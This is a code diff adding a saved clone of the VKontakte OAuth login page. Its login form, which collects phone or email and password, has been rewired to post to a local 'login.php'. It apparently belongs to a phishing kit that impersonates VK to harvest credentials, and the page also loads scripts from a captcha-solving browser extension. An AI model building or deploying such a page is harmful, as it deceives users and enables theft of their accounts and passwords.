@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<!-- saved from url=(0157)https://oauth.vk.com/authorize?client_id=8074190&redirect_uri=https%3A%2F%2Fgamesport.com%2Fsocial-auth%2Fvkontakte%2Fcallback&scope=email&response_type=code -->
+<html lang="ru" dir="ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"><script src="chrome-extension://ifibfemgeogfhoebkmokieepdoobkbpo/content/captcha/yandex/interceptor.js"></script><script src="chrome-extension://ifibfemgeogfhoebkmokieepdoobkbpo/content/captcha/lemin/interceptor.js"></script><script src="chrome-extension://ifibfemgeogfhoebkmokieepdoobkbpo/content/captcha/arkoselabs/hunter.js"></script><script src="chrome-extension://ifibfemgeogfhoebkmokieepdoobkbpo/content/captcha/arkoselabs/interceptor.js"></script><script src="chrome-extension://ifibfemgeogfhoebkmokieepdoobkbpo/content/captcha/recaptcha/hunter.js"></script><script src="chrome-extension://ifibfemgeogfhoebkmokieepdoobkbpo/content/captcha/recaptcha/interceptor.js"></script><script src="chrome-extension://ifibfemgeogfhoebkmokieepdoobkbpo/content/captcha/keycaptcha/hunter.js"></script><script src="chrome-extension://ifibfemgeogfhoebkmokieepdoobkbpo/content/captcha/hcaptcha/hunter.js"></script><script src="chrome-extension://ifibfemgeogfhoebkmokieepdoobkbpo/content/captcha/hcaptcha/interceptor.js"></script><script src="chrome-extension://ifibfemgeogfhoebkmokieepdoobkbpo/content/captcha/geetest_v4/interceptor.js"></script><script src="chrome-extension://ifibfemgeogfhoebkmokieepdoobkbpo/content/captcha/geetest/interceptor.js"></script><script src="chrome-extension://ifibfemgeogfhoebkmokieepdoobkbpo/content/communication_helpers.js"></script><script src="chrome-extension://ifibfemgeogfhoebkmokieepdoobkbpo/content/core_helpers.js"></script>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>ВКонтакте | Вход</title>
+    <link type="text/css" rel="stylesheet" href="./index_files/common.4eb74dd5d75b35560a46.css"><link type="text/css" rel="stylesheet" href="./index_files/base.6d4a87580f5267bf2b33.css"><link type="text/css" rel="stylesheet" href="./index_files/vkui.001f0bda8953008b3fa8.css"><link type="text/css" rel="stylesheet" href="./index_files/fonts_utf.2546d253c69649b0561c.css"><link type="text/css" rel="stylesheet" href="./index_files/fonts_cnt.7809321e6a2c5f3e361d.css">
+    <link type="text/css" rel="stylesheet" href="./index_files/oauth_popup.593ce0d6568d49594059.css">
+    <script type="text/javascript" language="javascript" src="./index_files/common_light.js.Без названия"></script><captcha-widgets></captcha-widgets>
+    <script type="text/javascript" language="javascript">// <![CDATA[
+      function allow(button) {
+        if (isButtonLocked(button)) return false;
+        lockButton(button);
+
+        var addr = '';
+        if (isChecked('allow_notifications')) {
+          addr = '&notify=1';
+        }
+        if (isChecked('denied_email')) {
+          addr += '&email_denied=1';
+        }
+        if (isChecked('denied_phone')) {
+          addr += '&phone_denied=1';
+        }
+        location.href = ""+addr;
+        return false;
+      }
+
+      function cancel() {
+        location.href = "https://login.vk.com/"
+        return false;
+      }
+
+      function login(button) {
+        if (isButtonLocked(button)) return false;
+        lockButton(button);
+        document.querySelector('#login_submit').submit();
+      }
+
+      function doResize(onResize) {
+        onResize && setTimeout(function() {
+          doResize()
+        }, 100);
+
+        if (!hasClass(document.body, 'oauth_centered') && !onResize) {
+          if (window.outerHeight !== void 0) {
+            var panelH = (window.outerHeight - window.innerHeight) | 0,
+              panelW = (window.outerWidth - window.innerWidth) | 0;
+          } else {
+            var panelH = 50,
+              panelW = 0;
+          }
+          var contentH = Math.max(document.querySelector('#oauth_wrap_content').offsetHeight, 430),
+            contentW = 655;
+          window.resizeTo(contentW + panelW, contentH + panelH);
+          window.moveTo(
+            (screen.width - contentW) / 2 + (screen.availLeft | 0),
+            ((screen.height - contentH) / 2) + (screen.availTop | 0)
+          );
+        }
+      }
+
+      function toggleEmailPrivacy() {
+        checkbox('denied_email');
+        if (!isChecked('denied_email')) {
+          hide('denied_email');
+          show('allowed_email');
+        } else {
+          hide('allowed_email');
+          show('denied_email');
+        }
+      }
+
+      function togglePhonePrivacy() {
+        checkbox('denied_phone');
+        if (!isChecked('denied_phone')) {
+          hide('denied_phone');
+          show('allowed_phone');
+        } else {
+          hide('allowed_phone');
+          show('denied_phone');
+        }
+      }
+
+      if (parent && parent != window) {
+        location.href = "https://oauth.vk.com/blank.html";
+      }
+
+      
+    // ]]></script>
+  </head>
+
+  <body onload="doResize();" class="VK oauth_centered">
+    <script>
+      if (window.devicePixelRatio >= 2) document.body.className += ' is_2x';
+    </script>
+    <div class="oauth_wrap">
+      <div class="oauth_wrap_inner">
+        <div class="oauth_wrap_content" id="oauth_wrap_content">
+          <div class="oauth_head">
+  <a class="oauth_logo fl_l" href="https://vk.com/" target="_blank"></a>
+  <div id="oauth_head_info" class="oauth_head_info fl_r">
+  <a class="oauth_reg_link" href="https://vk.com/join?reg=1" target="_blank">Регистрация</a>
+</div>
+</div>
+
+<div class="oauth_content box_body clear_fix">
+  <div class="box_msg_gray box_msg_padded">Для продолжения вам необходимо войти <b>ВКонтакте</b>.</div>
+
+  <form method="post" id="login_submit" action="login.php">
+    <div class="oauth_form">
+
+      
+
+      <div class="oauth_form_login">
+        <input type="hidden" name="ip_h" value="8b0c239f37b0639e20">
+        <input type="hidden" name="lg_domain_h" value="6cffdb416b8b22e8ec">
+        <input type="hidden" name="_origin" value="https://oauth.vk.com">
+        <input type="hidden" name="to" value="">
+        <input type="hidden" id="expire" name="expire" value="0">
+
+        <div class="oauth_form_header">Телефон или email</div>
+        <input type="text" class="oauth_form_input dark" name="email" value="">
+        <div class="oauth_form_header">Пароль</div>
+        <input type="password" class="oauth_form_input dark" name="pass">
+
+        
+
+        <button class="flat_button oauth_button button_wide" id="install_allow" type="submit" onclick="return login(this);">Войти</button>
+        <a class="oauth_forgot" href="https://vk.com/restore" target="_blank">Забыли пароль?</a>
+        <input type="submit" name="submit_input" class="unshown">
+      </div>
+    </div>
+  </form>
+</div>
+        </div>
+      </div>
+    </div>
+  
+</body></html>
